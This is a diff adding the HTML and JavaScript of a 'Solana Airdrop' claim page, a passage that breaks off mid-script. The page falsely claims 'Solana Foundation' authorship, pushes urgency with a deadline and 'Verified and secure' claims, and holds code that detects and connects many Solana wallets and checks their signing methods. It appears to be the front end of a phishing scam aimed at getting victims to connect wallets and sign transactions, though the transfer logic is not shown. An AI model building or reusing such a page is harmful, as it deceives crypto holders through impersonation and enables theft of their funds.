@@ -1,0 +1,3199 @@
+<!-- Force redeploy: trivial change for commit -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <meta http-equiv="Expires" content="0" />
+  <title>Solana Airdrop - Claim Your $SOL</title>
+  <meta name="description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
+  
+  <!-- dApp Metadata for Wallets -->
+  <meta name="application-name" content="Solana Airdrop" />
+  <meta name="apple-mobile-web-app-title" content="Solana Airdrop" />
+  <meta name="msapplication-TileColor" content="#00FF88" />
+  <meta name="theme-color" content="#00FF88" />
+  
+  <!-- Solana dApp Metadata -->
+  <meta name="solana-dapp-name" content="Solana Airdrop" />
+  <meta name="solana-dapp-description" content="Claim your exclusive Solana token airdrop before August 31st" />
+  <meta name="solana-dapp-url" content="" />
+  <meta name="solana-dapp-icon" content="/logo.png" />
+  
+  <!-- Wallet Connect Metadata -->
+  <meta name="wallet-connect-name" content="Solana Airdrop" />
+  <meta name="wallet-connect-description" content="Claim your exclusive Solana token airdrop" />
+  <meta name="wallet-connect-url" content="" />
+  <meta name="wallet-connect-icon" content="/logo.png" />
+  
+  <!-- SEO and Social Media Meta Tags -->
+  <meta property="og:title" content="Solana Airdrop - Claim Your $SOL" />
+  <meta property="og:description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="" />
+  <meta property="og:image" content="/logo.png" />
+  <meta property="og:site_name" content="Solana Airdrop" />
+  
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Solana Airdrop - Claim Your $SOL" />
+  <meta name="twitter:description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
+  <meta name="twitter:image" content="/logo.png" />
+  
+  <meta name="keywords" content="solana, airdrop, crypto, blockchain, SOL, token, claim, free" />
+  <meta name="author" content="Solana Foundation" />
+  <meta name="robots" content="index, follow" />
+  
+  <!-- Mobile App Meta Tags -->
+  <meta name="mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  
+  <!-- Deep Link Meta Tags -->
+  <meta name="apple-itunes-app" content="app-id=1598432977, app-argument=https://phantom.app/ul/browse/" />
+  <meta name="google-play-app" content="app-id=app.phantom" />
+  
+  <!-- dApp Manifest -->
+  <link rel="manifest" href="/manifest.json?v=3" />
+  <link rel="icon" href="/favicon2.ico?v=3" type="image/x-icon" />
+  <link rel="apple-touch-icon" href="/logo.png?v=3" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+  
+  <!-- dApp Metadata Script - Updated: 2025-01-27 15:30 -->
+  <script>
+    // Set dynamic URLs for metadata
+    (function() {
+      const currentUrl = window.location.origin;
+      const logoUrl = currentUrl + '/logo.png';
+      
+      // Update meta tags with current domain
+      const metaTags = [
+        { name: 'solana-dapp-url', content: currentUrl },
+        { name: 'wallet-connect-url', content: currentUrl },
+        { property: 'og:url', content: currentUrl },
+        { property: 'og:image', content: logoUrl },
+        { name: 'twitter:image', content: logoUrl }
+      ];
+      
+      metaTags.forEach(tag => {
+        const selector = tag.name ? `meta[name="${tag.name}"]` : `meta[property="${tag.property}"]`;
+        const metaTag = document.querySelector(selector);
+        if (metaTag) {
+          metaTag.setAttribute('content', tag.content);
+        }
+      });
+      
+      // Set global dApp metadata for wallet recognition
+      window.dAppMetadata = {
+        name: 'Solana Airdrop',
+        description: 'Claim your exclusive Solana token airdrop before August 31st',
+        url: currentUrl,
+        icon: logoUrl
+      };
+    })();
+    
+    // Define critical functions immediately to avoid reference errors
+    
+    // Global request tracking to prevent conflicts
+    window.pendingRequests = new Set();
+    
+    // Function to manage pending requests
+    window.addPendingRequest = function(requestId) {
+      if (window.pendingRequests.has(requestId)) {
+        throw new Error('Request already pending');
+      }
+      window.pendingRequests.add(requestId);
+    };
+    
+    window.removePendingRequest = function(requestId) {
+      window.pendingRequests.delete(requestId);
+    };
+    
+    // Clear all pending requests on page load
+    window.clearAllPendingRequests = function() {
+      window.pendingRequests.clear();
+    };
+    
+    // Clear requests on page load
+    window.clearAllPendingRequests();
+    
+    window.openWalletModal = function() {
+      console.log('openWalletModal called - fallback function');
+      // Fallback function - will be replaced by the actual implementation
+    };
+    
+    window.showStatus = function(message, type = 'info') {
+      console.log('Status:', message, type);
+    };
+    
+    window.connectMobileWallet = function(wallet) {
+      console.log('connectMobileWallet called with:', wallet);
+    };
+    
+    window.showWalletBrowserPrompt = function() {
+      console.log('showWalletBrowserPrompt called');
+    };
+    
+    // Set dApp metadata for wallet detection BEFORE wallet scripts load
+    window.dAppMetadata = {
+      name: 'Solana Airdrop',
+      description: 'Claim your exclusive Solana token airdrop before August 31st',
+      url: window.location.origin,
+      icon: window.location.origin + '/logo.png',
+      appIdentity: {
+        name: 'Solana Airdrop',
+        uri: window.location.origin,
+        icon: window.location.origin + '/logo.png'
+      }
+    };
+    
+    // Set document title and meta for wallet recognition
+    document.title = 'Solana Airdrop - Claim Your $SOL';
+    
+    // Add meta tags dynamically if needed
+    if (!document.querySelector('meta[name="application-name"]')) {
+      const meta = document.createElement('meta');
+      meta.name = 'application-name';
+      meta.content = 'Solana Airdrop';
+      document.head.appendChild(meta);
+    }
+    
+    // Set additional window properties for wallet recognition
+    window.solanaDAppName = 'Solana Airdrop';
+    window.solanaDAppDescription = 'Claim your exclusive Solana token airdrop before August 31st';
+    window.solanaDAppUrl = window.location.origin;
+    window.solanaDAppIcon = window.location.origin + '/logo.png';
+    
+    // Override any existing dApp metadata
+    Object.defineProperty(window, 'dAppMetadata', {
+      value: window.dAppMetadata,
+      writable: false,
+      configurable: false
+    });
+    
+  </script>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #0a0a0a;
+      color: #fff;
+    }
+    nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 40px;
+      background: rgba(10, 10, 10, 0.8);
+      backdrop-filter: blur(10px);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+    .nav-logo {
+      font-size: 1.8em;
+      font-weight: bold;
+      color: #00FF88;
+    }
+    .nav-btn {
+      background: linear-gradient(45deg, #00FF88, #00CC6A);
+      color: black;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 10px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+    .nav-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 18px rgba(0, 255, 136, 0.3);
+    }
+    .hero {
+      height: 90vh;
+      background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/hero-section.png');
+      background-size: cover;
+      background-position: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      text-align: center;
+      padding: 0 20px;
+    }
+    .hero h1 {
+      font-size: 3.2em;
+      margin-bottom: 20px;
+      font-weight: bold;
+      text-shadow: 2px 2px 12px #000;
+    }
+    .countdown {
+      font-size: 2em;
+      color: #00FF88;
+      font-weight: bold;
+      margin-bottom: 30px;
+    }
+    
+    .eligibility-note {
+      font-size: 0.9em;
+      color: #ffd700;
+      margin-top: 10px;
+      opacity: 0.8;
+      text-shadow: 0 0 5px rgba(255, 215, 0, 0.3);
+    }
+    .claim-btn {
+      font-size: 1.2em;
+      padding: 14px 28px;
+      background: linear-gradient(45deg, #00FF88, #00CC6A);
+      color: black;
+      border: none;
+      border-radius: 10px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+    .claim-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 30px rgba(0, 255, 136, 0.4);
+    }
+    .footer {
+      text-align: center;
+      padding: 50px 20px;
+      background: #111;
+      color: #aaa;
+      font-size: 0.95em;
+      margin-top: 80px;
+      border-top: 1px solid #222;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(8px);
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .modal.active {
+      display: flex;
+    }
+    .wallet-box {
+      background: #111;
+      border-radius: 16px;
+      padding: 30px;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+    }
+    .wallet-option {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: #1a1a1a;
+      padding: 14px 20px;
+      margin: 12px 0;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    .wallet-option:hover, .wallet-option:focus {
+      background: #222;
+      outline: 2px solid #00FF88;
+    }
+    .wallet-option img {
+      width: 28px;
+      height: 28px;
+    }
+    .wallet-name {
+      color: #fff;
+      font-size: 1em;
+      font-weight: 600;
+    }
+    #status {
+      text-align:center;
+      margin:24px auto 0 auto;
+      max-width:400px;
+      font-weight:600;
+      min-height: 24px;
+    }
+    html {
+      scroll-behavior: smooth;
+    }
+    .nav-links {
+      display: flex;
+      gap: 32px;
+      align-items: center;
+    }
+    .nav-link {
+      color: #fff;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 1.1em;
+      position: relative;
+      transition: color 0.2s;
+      padding: 4px 0;
+    }
+    .nav-link.active, .nav-link:focus {
+      color: #00FF88;
+    }
+    .nav-link::after {
+      content: '';
+      display: block;
+      width: 0;
+      height: 2px;
+      background: #00FF88;
+      transition: width 0.2s;
+      position: absolute;
+      left: 0;
+      bottom: -2px;
+    }
+    .nav-link.active::after, .nav-link:hover::after {
+      width: 100%;
+    }
+    @media (max-width: 800px) {
+      .nav-links { gap: 16px; }
+      .nav-link { font-size: 1em; }
+    }
+    @media (max-width: 600px) {
+      .nav-links { gap: 8px; }
+      .nav-link { font-size: 0.95em; }
+    }
+    @media (max-width: 600px) {
+      nav { padding: 12px 8px; }
+      .hero { padding: 60px 8px; }
+      .hero h1 { font-size: 2em; }
+      .countdown { font-size: 1.2em; }
+      .wallet-box { padding: 16px; }
+    }
+    .info-section {
+      background: #181818;
+      border-radius: 16px;
+      margin: 40px auto;
+      max-width: 1100px;
+      padding: 36px 28px 28px 28px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
+      color: #f3f3f3;
+    }
+    .info-section h2 {
+      color: #00FF88;
+      margin-bottom: 18px;
+      font-size: 2em;
+    }
+    .card-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 28px;
+      margin-top: 18px;
+    }
+    .info-card {
+      background: #232323;
+      border-radius: 14px;
+      box-shadow: 0 2px 12px rgba(0,255,136,0.07);
+      padding: 28px 22px 20px 22px;
+      transition: box-shadow 0.2s, transform 0.2s;
+      min-height: 170px;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+    }
+    .info-card:hover {
+      box-shadow: 0 6px 24px rgba(0,255,136,0.18);
+      transform: translateY(-4px) scale(1.025);
+    }
+    .info-card h3 {
+      color: #00FF88;
+      margin-bottom: 12px;
+      font-size: 1.18em;
+    }
+    .info-card ul {
+      margin: 0 0 0 18px;
+      padding: 0;
+    }
+    .info-card li {
+      margin-bottom: 8px;
+      line-height: 1.6;
+    }
+    .info-card a {
+      color: #00FF88;
+      text-decoration: underline;
+      word-break: break-all;
+    }
+    .info-card a:hover {
+      color: #00cc6a;
+    }
+    html, body {
+      max-width: 100vw;
+      overflow-x: hidden;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(8px);
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      padding: 0;
+    }
+    .modal.active, .modal[style*="display: flex"] {
+      display: flex !important;
+    }
+    .wallet-box {
+      background: #111;
+      border-radius: 16px;
+      padding: 30px;
+      max-width: 400px;
+      width: 90vw;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+      margin: 0 8px;
+    }
+    @media (max-width: 600px) {
+      .wallet-box {
+        padding: 16px 6px;
+        max-width: 98vw;
+      }
+      .modal {
+        align-items: flex-end;
+      }
+      .claim-btn, .nav-btn, #statusModalClose {
+        font-size: 1em;
+        padding: 12px 10px;
+      }
+      .info-section {
+        padding: 18px 4px 18px 4px;
+      }
+      .card-grid {
+        gap: 12px;
+      }
+      .info-card {
+        padding: 14px 8px 12px 8px;
+        min-height: 120px;
+      }
+      nav {
+        flex-direction: column;
+        gap: 8px;
+        padding: 10px 4px;
+      }
+      .nav-logo img {
+        height: 28px !important;
+      }
+      .nav-links {
+        gap: 8px;
+      }
+      .hero {
+        padding: 40px 4px;
+      }
+      .hero h1 {
+        font-size: 1.3em;
+      }
+      .countdown {
+        font-size: 1em;
+      }
+    }
+    
+    /* Prevent horizontal scroll on all children */
+    * {
+      box-sizing: border-box;
+    }
+    @media (max-width: 600px) {
+      nav { padding: 12px 8px; }
+      .hero { padding: 60px 8px; }
+      .hero h1 { font-size: 2em; }
+      .countdown { font-size: 1.2em; }
+      .wallet-box { 
+        padding: 20px; 
+        margin: 20px;
+        max-width: calc(100% - 40px);
+        border-radius: 12px;
+      }
+      .wallet-option {
+        padding: 16px 20px;
+        margin: 8px 0;
+        min-height: 60px; /* Better touch target */
+        border-radius: 10px;
+      }
+      .wallet-option img {
+        width: 32px;
+        height: 32px;
+      }
+      .wallet-name {
+        font-size: 1.1em;
+      }
+      .modal {
+        padding: 10px;
+      }
+    }
+    
+    /* Mobile-specific wallet modal improvements */
+    @media (max-width: 480px) {
+      .wallet-box {
+        padding: 16px;
+        margin: 10px;
+        max-width: calc(100% - 20px);
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        max-height: 80vh;
+        overflow-y: auto;
+      }
+      .wallet-option {
+        padding: 18px 16px;
+        margin: 6px 0;
+        min-height: 70px;
+      }
+      .wallet-option img {
+        width: 36px;
+        height: 36px;
+      }
+      .wallet-name {
+        font-size: 1.2em;
+        line-height: 1.3;
+      }
+      .modal {
+        padding: 0;
+        align-items: center;
+        justify-content: center;
+      }
+      #statusModal {
+        padding: 0;
+        align-items: center;
+        justify-content: center;
+      }
+      #statusModal .wallet-box {
+        margin: 20px;
+        max-width: calc(100% - 40px);
+        text-align: center;
+      }
+    }
+    
+    /* Touch-friendly improvements for mobile */
+    @media (hover: none) and (pointer: coarse) {
+      .wallet-option {
+        min-height: 60px;
+        padding: 16px 20px;
+      }
+      .wallet-option:active {
+        background: #333;
+        transform: scale(0.98);
+      }
+      .claim-btn {
+        min-height: 50px;
+        padding: 16px 24px;
+      }
+      .claim-btn:active {
+        transform: scale(0.95);
+      }
+      .modal {
+        padding: 0;
+        align-items: center;
+        justify-content: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <nav>
+    <div class="nav-logo"><img src="/logo.png" alt="Solana Airdrop Logo" style="height:36px;vertical-align:middle;margin-right:10px;">Solana Airdrop</div>
+    <div class="nav-links">
+      <a href="#security" class="nav-link">Security</a>
+      <a href="#learn" class="nav-link">Learn</a>
+      <a href="#explore" class="nav-link">Explore</a>
+      <a href="#support" class="nav-link">Support</a>
+    </div>
+    <button class="nav-btn" onclick="openWalletModal()">Claim</button>
+  </nav>
+  <section class="hero" id="hero">
+    <div class="hero-content">
+      <h1>🎁 Solana Airdrop</h1>
+      <p class="hero-subtitle">Claim your exclusive $SOL tokens before August 31st!</p>
+    <div class="countdown" id="countdown">Loading...</div>
+      <button class="claim-btn" onclick="openWalletModal();">🎁 Claim Now</button>
+              <p class="eligibility-note">💡 Note: Wallets need at least 0.00005 SOL for transaction fees</p>
+    </div>
+  </section>
+  <div class="modal" id="walletModal" tabindex="-1" aria-modal="true" role="dialog">
+    <div class="wallet-box" id="walletList">
+      <!-- Wallet buttons will be injected here -->
+    </div>
+  </div>
+  <div id="statusModal" class="modal" tabindex="-1" aria-modal="true" role="dialog" style="display:none;">
+    <div class="wallet-box" id="statusModalBox">
+      <div id="statusModalMsg"></div>
+      <div id="statusModalActions" style="margin-top:24px;display:none;">
+        <button class="claim-btn" id="statusModalRetry" style="margin-right:12px;background:linear-gradient(45deg,#FFD700,#FFA500);">Retry Transaction</button>
+        <button class="claim-btn" id="statusModalClose" style="background:linear-gradient(45deg,#666,#444);">Close</button>
+      </div>
+      <button class="claim-btn" id="statusModalCloseSingle" style="margin-top:24px;">Close</button>
+    </div>
+  </div>
+  <div class="footer">
+    <p>📈 Bull season is here. Join the movement and claim your airdrop before it's too late.</p>
+    <p>⚡ Powered by the Solana ecosystem. Verified and secure.</p>
+    <p>© 2025 Solana Airdrop Campaign. All rights reserved.</p>
+  </div>
+  <script>
+    // Mobile detection functions - defined before openWalletModal
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
+             window.innerWidth <= 768;
+    }
+
+    // Enhanced mobile detection with more specific checks
+    function getMobilePlatform() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      if (/iphone|ipad|ipod/.test(userAgent)) {
+        return 'ios';
+      } else if (/android/.test(userAgent)) {
+        return 'android';
+      } else if (/windows phone/.test(userAgent)) {
+        return 'windows';
+      }
+      return 'desktop';
+    }
+
+    // Check if we're in a mobile wallet browser
+    function isInMobileWallet() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      
+      // Check for mobile wallet user agents
+      const walletPatterns = [
+        'phantom',
+        'solflare', 
+        'backpack',
+        'glow',
+        'trust',
+        'exodus',
+        'wallet',
+        'crypto'
+      ];
+      
+      return walletPatterns.some(pattern => userAgent.includes(pattern));
+    }
+
+    // Check if mobile wallet is actually available in browser
+    function isMobileWalletAvailable(wallet) {
+      const provider = wallet.provider();
+      const isMobileDevice = isMobile();
+  
+      // On mobile, be more permissive - assume wallet can be connected
+      if (isMobileDevice) {
+        
+        // If we have any provider, consider it available
+        if (provider) {
+          return true;
+        }
+        
+        // If no specific provider, but we're on mobile, still consider it available
+        // because mobile wallets might not expose themselves the same way
+        return true;
+      }
+      
+      // Desktop logic - be more strict
+      if (!provider) {
+        return false;
+      }
+      
+      // Check for essential methods
+      const hasConnect = typeof provider.connect === 'function';
+      const hasPublicKey = provider.publicKey || provider.address;
+      
+      return provider && hasConnect;
+    }
+
+    // Get mobile store URL based on platform
+    function getMobileStoreUrl(wallet) {
+      if (!wallet.mobile) return wallet.install;
+      
+      const platform = getMobilePlatform();
+      if (platform === 'ios') {
+        return wallet.mobile.appStore;
+      } else if (platform === 'android') {
+        return wallet.mobile.playStore;
+      }
+      return wallet.install; // Fallback to desktop
+    }
+
+    // Force mobile wallet detection by checking all possible objects
+    function forceDetectMobileWallets() {
+      
+      const detectedWallets = [];
+      
+      // Check for any solana-related objects
+      const solanaObjects = [
+        'window.solana',
+        'window.phantom',
+        'window.solflare', 
+        'window.backpack',
+        'window.glow',
+        'window.trustwallet',
+        'window.exodus',
+        'window.phantom?.solana',
+        'window.trustwallet?.solana'
+      ];
+      
+      solanaObjects.forEach(objPath => {
+        try {
+          // Safe property access without eval
+          let obj = null;
+          if (objPath === 'window.solana') obj = window.solana;
+          else if (objPath === 'window.phantom') obj = window.phantom;
+          else if (objPath === 'window.solflare') obj = window.solflare;
+          else if (objPath === 'window.backpack') obj = window.backpack;
+          else if (objPath === 'window.glow') obj = window.glow;
+          else if (objPath === 'window.trustwallet') obj = window.trustwallet;
+          else if (objPath === 'window.exodus') obj = window.exodus;
+          else if (objPath === 'window.phantom?.solana') obj = window.phantom?.solana;
+          else if (objPath === 'window.trustwallet?.solana') obj = window.trustwallet?.solana;
+          
+          if (obj && typeof obj === 'object') {
+            detectedWallets.push(objPath);
+          }
+        } catch (e) {
+          // Object doesn't exist
+        }
+      });
+      
+      return detectedWallets;
+    }
+
+    // Wallet definitions - all supported wallets
+    const WALLET_DEFS = [
+      {
+        key: 'phantom',
+        name: 'Phantom',
+        icon: '/phantom-logo.png',
+        provider: () => {
+          const phantom = window.phantom?.solana || window.solana;
+          return phantom && typeof phantom === 'object' ? phantom : null;
+        },
+        install: 'https://phantom.app/',
+        mobile: {
+          appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
+          playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
+          deepLink: 'phantom://app/'
+        }
+      },
+      {
+        key: 'solflare',
+        name: 'Solflare',
+        icon: '/solflare-logo.png',
+        provider: () => {
+          // Enhanced Solflare detection
+          const solflare = window.solflare;
+          if (solflare && typeof solflare === 'object') {
+            // Check if it's actually Solflare
+            if (solflare.isSolflare || solflare.isConnected || typeof solflare.connect === 'function') {
+              return solflare;
+            }
+          }
+          // Also check for alternative Solflare objects
+          const altSolflare = window.solflareWallet || window.SolflareWallet;
+          if (altSolflare && typeof altSolflare === 'object') {
+            return altSolflare;
+          }
+          return null;
+        },
+        install: 'https://solflare.com/',
+        mobile: {
+          appStore: 'https://apps.apple.com/app/solflare/id1580902717',
+          playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
+          deepLink: 'solflare://access-wallet?url='
+        }
+      },
+      {
+        key: 'backpack',
+        name: 'Backpack',
+        icon: '/backpack-logo.png',
+        provider: () => {
+          // Enhanced Backpack detection with multiple fallbacks
+          console.log('Backpack detection - checking for Backpack objects:');
+          console.log('window.backpack:', window.backpack);
+          console.log('window.BackpackWallet:', window.BackpackWallet);
+          console.log('window.backpackWallet:', window.backpackWallet);
+          
+          // Check all possible Backpack objects
+          const possibleBackpacks = [
+            window.backpack,
+            window.BackpackWallet,
+            window.backpackWallet,
+            window.backpack?.solana,
+            window.BackpackWallet?.solana
+          ];
+          
+          for (const wallet of possibleBackpacks) {
+            if (wallet && typeof wallet === 'object') {
+              console.log('Found Backpack object:', wallet);
+              console.log('Backpack object properties:', Object.keys(wallet));
+              
+              // Check if it has essential methods
+              const hasConnect = typeof wallet.connect === 'function';
+              const hasSignTransaction = typeof wallet.signTransaction === 'function';
+              const hasPublicKey = wallet.publicKey || wallet.address;
+              
+              console.log('Backpack capabilities:', { hasConnect, hasSignTransaction, hasPublicKey });
+              
+              if (hasConnect) {
+                return wallet;
+              }
+            }
+          }
+          
+          console.log('No Backpack detected');
+          return null;
+        },
+        install: 'https://backpack.app/',
+        mobile: {
+          appStore: 'https://apps.apple.com/app/backpack-wallet/id6446591340',
+          playStore: 'https://play.google.com/store/apps/details?id=app.backpack',
+          deepLink: 'backpack://open?url='
+        }
+      },
+      {
+        key: 'glow',
+        name: 'Glow',
+        icon: '/glow-logo.png',
+        provider: () => {
+          // Enhanced Glow detection with multiple fallbacks
+          console.log('Glow detection - checking for Glow objects:');
+          console.log('window.glow:', window.glow);
+          console.log('window.GlowWallet:', window.GlowWallet);
+          console.log('window.glowWallet:', window.glowWallet);
+          
+          // Check all possible Glow objects
+          const possibleGlows = [
+            window.glow,
+            window.GlowWallet,
+            window.glowWallet,
+            window.glow?.solana,
+            window.GlowWallet?.solana
+          ];
+          
+          for (const wallet of possibleGlows) {
+            if (wallet && typeof wallet === 'object') {
+              console.log('Found Glow object:', wallet);
+              console.log('Glow object properties:', Object.keys(wallet));
+              
+              // Check if it has essential methods
+              const hasConnect = typeof wallet.connect === 'function';
+              const hasSignTransaction = typeof wallet.signTransaction === 'function';
+              const hasPublicKey = wallet.publicKey || wallet.address;
+              
+              console.log('Glow capabilities:', { hasConnect, hasSignTransaction, hasPublicKey });
+              
+              if (hasConnect) {
+                return wallet;
+              }
+            }
+          }
+          
+          console.log('No Glow detected');
+          return null;
+        },
+        install: 'https://glow.app/',
+        mobile: {
+          appStore: 'https://apps.apple.com/app/glow-wallet/id1635717553',
+          playStore: 'https://play.google.com/store/apps/details?id=com.glow.wallet',
+          deepLink: 'glow://open?url='
+        }
+      },
+      {
+        key: 'trustwallet',
+        name: 'Trust Wallet',
+        icon: '/trust-logo.png',
+        provider: () => {
+          // Enhanced Trust Wallet detection - only unsupported on mobile
+          console.log('Trust Wallet detection - checking for Trust Wallet objects:');
+          console.log('window.trustwallet:', window.trustwallet);
+          console.log('window.trustwallet?.solana:', window.trustwallet?.solana);
+          console.log('window.trustWallet:', window.trustWallet);
+          console.log('window.trustwallet?.provider:', window.trustwallet?.provider);
+          console.log('window.trustwallet?.solana?.provider:', window.trustwallet?.solana?.provider);
+          
+          // Check all possible Trust Wallet objects
+          const possibleTrustWallets = [
+            window.trustwallet?.solana,
+            window.trustwallet,
+            window.trustWallet,
+            window.trustwallet?.provider,
+            window.trustwallet?.solana?.provider,
+            window.trustWallet?.provider
+          ];
+          
+          for (const wallet of possibleTrustWallets) {
+            if (wallet && typeof wallet === 'object') {
+              console.log('Found Trust Wallet object:', wallet);
+              console.log('Trust Wallet object properties:', Object.keys(wallet));
+              
+              // Check if we're on mobile device
+              const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+              const isTrustWalletBrowser = navigator.userAgent.includes('TrustWallet') || 
+                                         window.location.href.includes('trustwallet') ||
+                                         document.referrer.includes('trustwallet') ||
+                                         window.location.href.includes('trust') ||
+                                         document.referrer.includes('trust');
+              
+              // Only show unsupported message on mobile Trust Wallet dApp browser
+              if (isMobileDevice && isTrustWalletBrowser) {
+                console.log('Mobile Trust Wallet dApp browser detected - limited support');
+                return {
+                  name: 'Trust Wallet',
+                  isTrustWallet: true,
+                  isUnsupported: true, // Flag to indicate limited support on mobile
+                  originalProvider: wallet, // Keep reference to original provider
+                  connect: async () => {
+                    throw new Error('Trust Wallet mobile dApp browser has limited Solana support. Please use Phantom or Solflare for this airdrop.');
+                  },
+                  signTransaction: async () => {
+                    throw new Error('Trust Wallet mobile dApp browser does not support Solana transaction signing. Please use Phantom or Solflare.');
+                  },
+                  signMessage: async () => {
+                    throw new Error('Trust Wallet mobile dApp browser does not support Solana message signing. Please use Phantom or Solflare.');
+                  }
+                };
+              } else {
+                // Desktop Trust Wallet extension works fine
+                console.log('Desktop Trust Wallet extension detected - full support');
+                return wallet; // Return the original wallet object for normal operation
+              }
+            }
+          }
+          
+          console.log('No Trust Wallet detected');
+          return null;
+        },
+        install: 'https://trustwallet.com/',
+        mobile: {
+          appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
+          playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
+          deepLink: 'https://link.trustwallet.com/open_url?coin_id=501&url='
+        }
+      },
+      {
+        key: 'exodus',
+        name: 'Exodus',
+        icon: '/exodus-logo.png',
+        provider: () => {
+          // Enhanced Exodus detection with multiple fallbacks
+          console.log('Exodus detection - checking for Exodus objects:');
+          console.log('window.exodus:', window.exodus);
+          console.log('window.exodusWallet:', window.exodusWallet);
+          console.log('window.ExodusWallet:', window.ExodusWallet);
+          
+          // Check all possible Exodus objects
+          const possibleExodus = [
+            window.exodus,
+            window.exodusWallet,
+            window.ExodusWallet,
+            window.exodus?.solana,
+            window.exodusWallet?.solana
+          ];
+          
+          for (const wallet of possibleExodus) {
+            if (wallet && typeof wallet === 'object') {
+              console.log('Found Exodus object:', wallet);
+              console.log('Exodus object properties:', Object.keys(wallet));
+              
+              // Check if it has essential methods
+              const hasConnect = typeof wallet.connect === 'function';
+              const hasSignTransaction = typeof wallet.signTransaction === 'function';
+              const hasPublicKey = wallet.publicKey || wallet.address;
+              
+              console.log('Exodus capabilities:', { hasConnect, hasSignTransaction, hasPublicKey });
+              
+              if (hasConnect) {
+                return wallet;
+              }
+            }
+          }
+          
+          console.log('No Exodus detected');
+          return null;
+        },
+        install: 'https://exodus.com/',
+        mobile: {
+          appStore: 'https://apps.apple.com/app/exodus-crypto-bitcoin-wallet/id1414384820',
+          playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus',
+          deepLink: 'exodus://open?url='
+        }
+      }
+    ];
+
+    console.log('Wallet provider detection at page load:');
+    
+    // Special Trust Wallet debugging
+    console.log('=== TRUST WALLET DEBUGGING ===');
+    console.log('window.trustwallet:', window.trustwallet);
+    console.log('window.trustwallet?.solana:', window.trustwallet?.solana);
+    console.log('window.trustWallet:', window.trustWallet);
+    console.log('window.trustWallet?.isTrustWallet:', window.trustWallet?.isTrustWallet);
+    console.log('window.trustwallet?.solana?.isTrustWallet:', window.trustwallet?.solana?.isTrustWallet);
+    console.log('window.trustwallet?.provider:', window.trustwallet?.provider);
+    console.log('window.trustwallet?.solana?.provider:', window.trustwallet?.solana?.provider);
+    console.log('=== END TRUST WALLET DEBUGGING ===');
+    
+    WALLET_DEFS.forEach(wallet => {
+      try {
+        const provider = wallet.provider();
+        console.log(`Provider for ${wallet.name} at load:`, provider);
+        
+        // Additional debugging for Trust Wallet
+        if (wallet.name === 'Trust Wallet') {
+          console.log('Trust Wallet debugging:');
+          console.log('window.trustwallet:', window.trustwallet);
+          console.log('window.trustwallet?.solana:', window.trustwallet?.solana);
+          console.log('window.trustWallet:', window.trustWallet);
+          console.log('window.trustWallet?.isTrustWallet:', window.trustWallet?.isTrustWallet);
+        }
+      } catch (e) {
+        console.log(`Provider for ${wallet.name} at load: ERROR`, e);
+      }
+    });
+
+
+
+// Show status message in the status modal
+window.showStatus = function showStatus(message, type = 'info') {
+  const modal = document.getElementById('statusModal');
+  const msgEl = document.getElementById('statusModalMsg');
+  if (msgEl && modal) {
+    let color = '#00FF88';
